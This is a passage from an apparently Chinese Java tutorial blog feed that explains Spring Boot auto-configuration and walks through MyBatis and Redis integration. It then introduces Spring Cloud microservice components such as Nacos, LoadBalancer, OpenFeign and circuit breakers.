class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    String[] excludeName() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>@EnableAutoConfiguration也是一个组合注解，其中最关键的组合注解属性是@Import。@Import注解借助AutoConfigurationImportSelector，使得@EnableAutoConfiguration 可以帮助SpringBoot应用将所有符合条件的@Configuration配置都加载到当前SpringBoot创建并使用的IOC容器。通过@Import（AutoConfigurationImportSelector.class）导入的配置功能，AutoConfigurationImportSelector 中的方法 getCandidateConfigurations，得到待配置的class的类名集合，这个集合就是所有需要进行自动配置的类，而是否配置的关键在于META-INF&#x2F;spring.factories 文件中是否存在该配置信息</p>
<p>AutoConfigurationImportSelector类中核心方法getCandidateConfigurations的源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> List&lt;String&gt; <span class="title function_">getCandidateConfigurations</span><span class="params">(AnnotationMetadata metadata, AnnotationAttributes attributes)</span> &#123;</span><br><span class="line">    List&lt;String&gt; configurations = SpringFactoriesLoader.loadFactoryNames(<span class="built_in">this</span>.getSpringFactoriesLoaderFactoryClass(), <span class="built_in">this</span>.getBeanClassLoader());</span><br><span class="line">    Assert.notEmpty(configurations, <span class="string">&quot;No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> configurations;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getCandidateConfigurations调用了SpringFactoriesLoader.loadFactoryNames，该方法源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">loadFactoryNames</span><span class="params">(Class&lt;?&gt; factoryType, <span class="meta">@Nullable</span> ClassLoader classLoader)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">factoryTypeName</span> <span class="operator">=</span> factoryType.getName();</span><br><span class="line">    <span class="keyword">return</span> (List)loadSpringFactories(classLoader).getOrDefault(factoryTypeName, Collections.emptyList());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SpringFactoriesLoader.loadFactoryNames，该方法源码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, List&lt;String&gt;&gt; <span class="title function_">loadSpringFactories</span><span class="params">(<span class="meta">@Nullable</span> ClassLoader classLoader)</span> &#123;</span><br><span class="line">    MultiValueMap&lt;String, String&gt; result = (MultiValueMap)cache.get(classLoader);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Enumeration&lt;URL&gt; urls = classLoader != <span class="literal">null</span> ? classLoader.getResources(<span class="string">&quot;META-INF/spring.factories&quot;</span>) : ClassLoader.getSystemResources(<span class="string">&quot;META-INF/spring.factories&quot;</span>);</span><br><span class="line">            MultiValueMap&lt;String, String&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedMultiValueMap</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(urls.hasMoreElements()) &#123;</span><br><span class="line">                <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> (URL)urls.nextElement();</span><br><span class="line">                <span class="type">UrlResource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlResource</span>(url);</span><br><span class="line">                <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> PropertiesLoaderUtils.loadProperties(resource);</span><br><span class="line">                <span class="type">Iterator</span> <span class="variable">var6</span> <span class="operator">=</span> properties.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(var6.hasNext()) &#123;</span><br><span class="line">                    Map.Entry&lt;?, ?&gt; entry = (Map.Entry)var6.next();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">factoryTypeName</span> <span class="operator">=</span> ((String)entry.getKey()).trim();</span><br><span class="line">                    String[] var9 = StringUtils.commaDelimitedListToStringArray((String)entry.getValue());</span><br><span class="line">                    <span class="type">int</span> <span class="variable">var10</span> <span class="operator">=</span> var9.length;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="number">0</span>; var11 &lt; var10; ++var11) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">factoryImplementationName</span> <span class="operator">=</span> var9[var11];</span><br><span class="line">                        result.add(factoryTypeName, factoryImplementationName.trim());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            cache.put(classLoader, result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var13) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unable to load factories from location [META-INF/spring.factories]&quot;</span>, var13);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到源码里写死了META-INF&#x2F;spring.factories这个路径，这就是我们在使用spring自动配置功能时，为什么需要在这个路径下声明自己的配置类的原因了！比如自定义Starter就用到了这个配置文件</p>
<h1 id="SpringBoot整合其他技术"><a href="#SpringBoot整合其他技术" class="headerlink" title="SpringBoot整合其他技术"></a>SpringBoot整合其他技术</h1><h2 id="SpringBoot整合Mybatis"><a href="#SpringBoot整合Mybatis" class="headerlink" title="SpringBoot整合Mybatis"></a>SpringBoot整合Mybatis</h2><h3 id="添加Mybatis的起步依赖"><a href="#添加Mybatis的起步依赖" class="headerlink" title="添加Mybatis的起步依赖"></a>添加Mybatis的起步依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--mybatis起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="添加数据库驱动坐标"><a href="#添加数据库驱动坐标" class="headerlink" title="添加数据库驱动坐标"></a>添加数据库驱动坐标</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- MySQL连接驱动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="添加数据库连接信息"><a href="#添加数据库连接信息" class="headerlink" title="添加数据库连接信息"></a>添加数据库连接信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#DB Configuration:</span></span><br><span class="line">spring.datasource.driverClassName=com.mysql.jdbc.Driver</span><br><span class="line">spring.datasource.url=jdbc:mysql://127.0.0.1:3306/test?useUnicode=<span class="literal">true</span>&amp;characterEncoding=utf8</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=root</span><br></pre></td></tr></table></figure>

<h3 id="创建user表"><a href="#创建user表" class="headerlink" title="创建user表"></a>创建user表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for `user`</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `<span class="keyword">user</span>`;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> `<span class="keyword">user</span>` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">10</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of user</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT INTO</span> `<span class="keyword">user</span>` <span class="keyword">VALUES</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> `<span class="keyword">user</span>` <span class="keyword">VALUES</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;李四&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="创建实体Bean"><a href="#创建实体Bean" class="headerlink" title="创建实体Bean"></a>创建实体Bean</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">// 主键</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="comment">// 用户名</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="comment">// 密码</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="comment">// 姓名</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//此处省略getter和setter方法 .. ..</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="编写Mapper"><a href="#编写Mapper" class="headerlink" title="编写Mapper"></a>编写Mapper</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> List&lt;User&gt; <span class="title function_">queryUserList</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：@Mapper标记该类是一个mybatis的mapper接口，可以被spring boot自动扫描到spring上下文中</p>
</blockquote>
<h3 id="配置Mapper映射文件"><a href="#配置Mapper映射文件" class="headerlink" title="配置Mapper映射文件"></a>配置Mapper映射文件</h3><p>在src\main\resources\mapper路径下加入UserMapper.xml配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.itheima.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">        select * from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="在application-properties中添加mybatis的信息"><a href="#在application-properties中添加mybatis的信息" class="headerlink" title="在application.properties中添加mybatis的信息"></a>在application.properties中添加mybatis的信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#spring集成Mybatis环境</span></span><br><span class="line"><span class="comment">#pojo别名扫描包</span></span><br><span class="line">mybatis.type-aliases-package=com.itheima.domain</span><br><span class="line"><span class="comment">#加载Mybatis映射文件</span></span><br><span class="line">mybatis.mapper-locations=classpath:mapper/*Mapper.xml</span><br></pre></td></tr></table></figure>

<h3 id="编写测试Controller"><a href="#编写测试Controller" class="headerlink" title="编写测试Controller"></a>编写测试Controller</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapperController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/queryUser&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">queryUser</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;User&gt; users = userMapper.queryUserList();</span><br><span class="line">        <span class="keyword">return</span> users;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="SpringBoot整合redis"><a href="#SpringBoot整合redis" class="headerlink" title="SpringBoot整合redis"></a>SpringBoot整合redis</h2><h3 id="添加redis的起步依赖"><a href="#添加redis的起步依赖" class="headerlink" title="添加redis的起步依赖"></a>添加redis的起步依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置使用redis启动器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Redis</span></span><br><span class="line">spring.redis.host=127.0.0.1</span><br><span class="line">spring.redis.port=6379</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = SpringbootJpaApplication.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String, String&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> JsonProcessingException &#123;</span><br><span class="line">        <span class="comment">//从redis缓存中获得指定的数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">userListData</span> <span class="operator">=</span> redisTemplate.boundValueOps(<span class="string">&quot;user.findAll&quot;</span>).get();</span><br><span class="line">        <span class="comment">//如果redis中没有数据的话</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span>==userListData)&#123;</span><br><span class="line">            <span class="comment">//查询数据库获得数据</span></span><br><span class="line">            List&lt;User&gt; all = userRepository.findAll();</span><br><span class="line">            <span class="comment">//转换成json格式字符串</span></span><br><span class="line">            <span class="type">ObjectMapper</span> <span class="variable">om</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">            userListData = om.writeValueAsString(all);</span><br><span class="line">            <span class="comment">//将数据存储到redis中，下次在查询直接从redis中获得数据，不用在查询数据库</span></span><br><span class="line">            redisTemplate.boundValueOps(<span class="string">&quot;user.findAll&quot;</span>).set(userListData);</span><br><span class="line">            System.out.println(<span class="string">&quot;===============从数据库获得数据===============&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;===============从redis缓存中获得数据===============&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(userListData);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结就是引入依赖 然后配置文件 编写代码测试类</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud学习总结</title>
    <url>/2024/08/08/SpringCloud/</url>
    <content><![CDATA[<h1 id="什么是微服务"><a href="#什么是微服务" class="headerlink" title="什么是微服务"></a>什么是微服务</h1><p>微服务是一种架构风格，一个大型复杂软件应用由一个或多个微服务组成。系统中的各个微服务可被独立部署，各个微服务之间是松耦合的。每个微服务仅关注于完成一件任务并很好地完成该任务。在所有情况下，每个任务代表着一个小的业务能力</p>
<h2 id="微服务有什么用呢"><a href="#微服务有什么用呢" class="headerlink" title="微服务有什么用呢"></a>微服务有什么用呢</h2><p>答：解决单体应用规模增加时带来的问题</p>
<h2 id="微服务-vs-单体应用"><a href="#微服务-vs-单体应用" class="headerlink" title="微服务 vs 单体应用"></a>微服务 vs 单体应用</h2><ul>
<li>单体应用将所有功能放在一个单一进程中</li>
<li>微服务把每个功能元素放进一个独立的服务中，在多个服务器复制，跨服务器统一管理</li>
<li>单体应用优点：稳定，性能，部署</li>
<li>单体应用缺点：中心化，耦合，学习成本，伸缩性，持续交付</li>
<li>适情况选择单体应用或微服务，不要为了技术而技术</li>
</ul>
<p>微服务架构解决了单体架构存在的问题，特别适合大型互联网项目的开发，因此被各大互联网公司普遍采用。分布式就是服务拆分的过程，其实微服务架构正式分布式架构的一种最佳实践的方案<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/SpringCloud/baseStruct.png" alt="架构图"></p>
<h1 id="微服务组件"><a href="#微服务组件" class="headerlink" title="微服务组件"></a>微服务组件</h1><p>我们通过一张总的大型微服务架构图来详解 Spring Cloud 六大核心组件。Spring Cloud 提供了一套完整的分布式系统解决方案（微服务全家桶），基于 Spring Boot，简化了分布式系统基础设施（如服务发现、配置管理、熔断器、网关等）的开发</p>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/SpringCloud/allStruct.png" alt="大型架构图"></p>
<h2 id="服务注册与发现：Eureka-Nacos"><a href="#服务注册与发现：Eureka-Nacos" class="headerlink" title="服务注册与发现：Eureka &#x2F; Nacos"></a>服务注册与发现：Eureka &#x2F; Nacos</h2><ul>
<li><p>功能： 微服务架构的核心基础。服务提供者启动时向注册中心注册自己的信息（如 IP、端口、服务名），服务消费者从注册中心获取服务提供者的网络位置信息，实现服务的自动发现与调用。</p>
</li>
<li><p>核心概念：</p>
</li>
</ul>
<p>服务注册中心 (Eureka Server &#x2F; Nacos Server)： 提供服务注册与发现功能的服务端。</p>
<p>服务提供者 (Eureka Client &#x2F; Nacos Client)： 向注册中心注册自身服务实例的应用。</p>
<p>服务消费者 (Eureka Client &#x2F; Nacos Client)： 从注册中心获取服务提供者列表并进行调用的应用（通常服务提供者也是消费者）。</p>
<ul>
<li>工作流程：</li>
</ul>
<p>启动注册中心： 独立部署 Eureka Server 或 Nacos Server。</p>
<p>服务注册： 服务提供者（集成 Client）启动时，向注册中心发送心跳，注册自己的信息。</p>
<p>服务续约： 服务提供者定期（默认30秒）发送心跳给注册中心，表明自己“活着”。</p>
<p>服务获取： 服务消费者启动时，或需要调用服务时，从注册中心拉取（或由注册中心推送）服务提供者列表（并缓存）。</p>
<p>服务调用： 服务消费者根据负载均衡策略（如 Ribbon），从服务列表中选择一个实例进行调用。</p>
<p>服务下线： 服务提供者正常关闭前，发送下线请求给注册中心；注册中心也会剔除长时间未续约的实例。</p>
<ul>
<li><p>优势： 解耦服务提供者与消费者，动态感知服务实例变化，提高系统弹性和可用性。</p>
</li>
<li><p>Eureka vs Nacos (简要)：</p>
</li>
</ul>
<p>Eureka (Netflix)： AP 模型（高可用、分区容忍），适合对一致性要求不高的场景。Spring Cloud 原生支持好，但已进入维护模式。</p>
<p>Nacos (Alibaba)： 同时支持服务发现（AP&#x2F;CP 可选）和 配置中心功能，功能更强大、更活跃，是目前主流推荐。</p>
<h2 id="客户端负载均衡：Ribbon-Spring-Cloud-LoadBalancer"><a href="#客户端负载均衡：Ribbon-Spring-Cloud-LoadBalancer" class="headerlink" title="客户端负载均衡：Ribbon &#x2F; Spring Cloud LoadBalancer"></a>客户端负载均衡：Ribbon &#x2F; Spring Cloud LoadBalancer</h2><ul>
<li><p>功能： 在服务消费者端实现负载均衡。当服务消费者从注册中心获取到多个服务提供者实例列表后，Ribbon&#x2F;LoadBalancer 负责根据特定策略（如轮询、随机、响应时间加权等）选择一个实例进行调用。</p>
</li>
<li><p>工作位置： 集成在服务消费者内部，通常与 RestTemplate、Feign 或 WebClient 配合使用。</p>
</li>
<li><p>核心组件：</p>
</li>
</ul>
<p>ServerList: 获取可用服务实例列表（通常从注册中心如 Eureka 获取）。</p>
<p>IRule: 负载均衡规则接口（如 RoundRobinRule 轮询, RandomRule 随机, WeightedResponseTimeRule 响应时间加权等）。</p>
<p>ServerListFilter: 过滤掉不健康的服务实例。</p>
<p>IPing: 检查服务实例是否存活（通常依赖注册中心的心跳）。</p>
<ul>
<li>使用方式：</li>
</ul>
<p>使用 @LoadBalanced 注解修饰 RestTemplate 或 WebClient.Builder Bean。</p>
<p>或直接使用声明式的 Feign 客户端（Feign 默认集成了 Ribbon&#x2F;LoadBalancer）。</p>
<ul>
<li>Ribbon vs Spring Cloud LoadBalancer：</li>
</ul>
<p>Ribbon (Netflix)： 曾是主流，已进入维护模式。</p>
<p>Spring Cloud LoadBalancer： Spring Cloud 官方推出的下一代负载均衡器，旨在替代 Ribbon。更轻量、更易扩展，支持 Reactive 编程模型，是当前推荐。</p>
<h2 id="分布式服务调用：OpenFeign"><a href="#分布式服务调用：OpenFeign" class="headerlink" title="分布式服务调用：OpenFeign"></a>分布式服务调用：OpenFeign</h2><ul>
<li><p>功能： 基于接口和注解的声明式 HTTP 客户端。开发者只需定义一个 Java 接口并用注解（如 @FeignClient）描述它需要调用的远程服务接口（包括方法签名、请求路径、参数等），Feign 会在运行时自动生成该接口的实现类，处理 HTTP 请求的序列化、发送、反序列化等细节。</p>
</li>
<li><p>核心优势：</p>
</li>
</ul>
<p>简化开发： 像调用本地方法一样调用远程 HTTP 服务，无需手动构造 HTTP 请求、处理响应。</p>
<p>与注册中心集成： 结合 Eureka&#x2F;Nacos，@FeignClient 中的服务名会自动解析为注册中心中的实际服务实例地址。</p>
<p>与负载均衡集成： 默认集成了 Ribbon&#x2F;Spring Cloud LoadBalancer，实现客户端负载均衡。</p>
<p>可插拔编码器&#x2F;解码器： 支持 JSON (如 Jackson)、XML 等格式的序列化&#x2F;反序列化。</p>
<p>支持熔断器： 可方便集成 Hystrix 或 Resilience4j。</p>
<ul>
<li>核心注解：</li>
</ul>
<p>@EnableFeignClients: 在启动类上启用 Feign 功能扫描。</p>
<p>@FeignClient(name &#x3D; “service-name”): 标注在接口上，声明这是一个 Feign 客户端，name&#x2F;value 指定要调用的服务名</p>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lzj.api;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lzj.result.JSONResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.FeignClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FeignClient(&quot;service-course&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">courseOrderApi</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value=&quot;/course/info/&#123;courseId&#125;&quot;,method= RequestMethod.GET)</span></span><br><span class="line">    JSONResult <span class="title function_">courseInfo</span><span class="params">(<span class="meta">@PathVariable(&quot;courseId&quot;)</span> String courseId)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/course&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CourseController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> ICourseService courseService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 购买课程时获取购买的课程信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(value=&quot;/info/&#123;courseId&#125;&quot;,method=RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> JSONResult <span class="title function_">courseInfo</span><span class="params">(<span class="meta">@PathVariable(&quot;courseId&quot;)</span> String courseId)</span>&#123;</span><br><span class="line">        <span class="type">CourseInfoResultVo</span> <span class="variable">courseInfoResultVo</span> <span class="operator">=</span> courseService.courseInfo(courseId);</span><br><span class="line">        <span class="keyword">return</span> JSONResult.success(courseInfoResultVo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="服务容错保护：Hystrix-维护中-Resilience4j-Sentinel"><a href="#服务容错保护：Hystrix-维护中-Resilience4j-Sentinel" class="headerlink" title="服务容错保护：Hystrix (维护中) &#x2F; Resilience4j &#x2F; Sentinel"></a>服务容错保护：Hystrix (维护中) &#x2F; Resilience4j &#x2F; Sentinel</h2><ul>
<li><p>功能： 在分布式系统中，防止因某个服务的故障（如长时间响应、宕机）导致级联故障（雪崩效应），提高系统的整体弹性。</p>
</li>
<li><p>核心模式：</p>
</li>
</ul>
<p>熔断器 (Circuit Breaker)：</p>
<p>状态机： 关闭 (Closed) -&gt; 打开 (Open) -&gt; 半开 (Half-Open)。</p>
<p>关闭状态： 请求正常通过，同时统计失败率。</p>
<p>打开状态： 当失败率&#x2F;错误数达到阈值，熔断器打开，后续请求快速失败（直接调用 Fallback 方法），不再尝试调用故障服务，避免资源耗尽。</p>
<p>半开状态： 经过一段时间（睡眠窗口），熔断器进入半开状态，允许少量试探请求通过。如果成功，则关闭熔断器；如果失败，则继续保持打开。</p>
<p>服务降级 (Fallback)： 当服务调用失败（超时、异常、熔断打开）时，执行预先定义好的备选逻辑（Fallback 方法），返回一个可接受的默认值、缓存数据或友好提示，保证核心功能或主流程可用。</p>
<p>资源隔离 (舱壁模式)： 如线程池隔离或信号量隔离，将不同服务的调用隔离在不同的资源池中，避免一个服务的高延迟或故障耗尽所有资源（如线程），影响其他服务。</p>
<ul>
<li>组件对比：</li>
</ul>
<p>Hystrix (Netflix)： 曾经是 Spring Cloud 默认的容错库，功能强大但较重，已进入维护模式，不推荐新项目使用。</p>
<p>Resilience4j： 轻量级、函数式编程、模块化设计的容错库。基于 Java 8 的函数式接口和 Vavr，更易用、更灵活，是 Spring Cloud Circuit Breaker 的默认实现之一。</p>
<p>Sentinel (Alibaba)： 功能更全面，不仅提供熔断降级，还提供流量控制、系统自适应保护、实时监控和控制台。功能强大，社区活跃，是强力竞争者。</p>
<ul>
<li>Resilience4j 核心用法 (示例)：</li>
</ul>
<p>添加依赖 (resilience4j-spring-boot2, spring-boot-starter-aop)</p>
<p>配置熔断器规则 (application.yml)</p>
